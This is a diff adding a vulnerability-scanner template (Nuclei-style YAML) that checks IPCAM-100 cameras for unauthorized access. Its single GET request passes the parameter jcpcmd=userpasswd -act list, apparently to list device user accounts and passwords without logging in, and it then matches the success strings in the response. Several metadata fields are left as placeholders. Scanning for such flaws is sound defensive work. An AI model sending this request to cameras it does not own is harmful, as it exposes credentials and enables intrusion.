@@ -1,0 +1,24 @@
+id: IPCAM-100-jcpcmd-un
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: IPCAM-100 存在未授权访问
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?jcpcmd=userpasswd%20-act%20list"
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - Success
+      - type: word
+        part: body
+        words:
+          - szJcpResult
